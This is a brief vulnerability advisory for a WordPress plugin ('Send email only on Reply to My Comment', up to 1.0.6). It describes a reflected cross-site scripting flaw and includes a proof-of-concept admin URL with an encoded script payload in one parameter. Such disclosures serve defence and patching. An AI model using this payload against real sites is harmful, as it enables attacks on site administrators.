## WordPress Plugin Vulnerabilities

# Send email only on Reply to My Comment <= 1.0.6 - Reflected XSS

### Description

The plugin does not sanitise and escape a parameter before outputting it back in the page, leading to a Reflected Cross-Site Scripting which could be used against high privilege users such as admin

### Proof of Concept

Have an admin open the URL:
`https://example.com/wp-admin/options-general.php?page=send-email-only-on-reply-to-my-comment%2Foptions%2Findex.php&subscribepanel=1&sra=edit-subscription&srp=1332&sre=%27%3E%3Cscript%3Ealert%282%29%3C%2Fscript%3E`
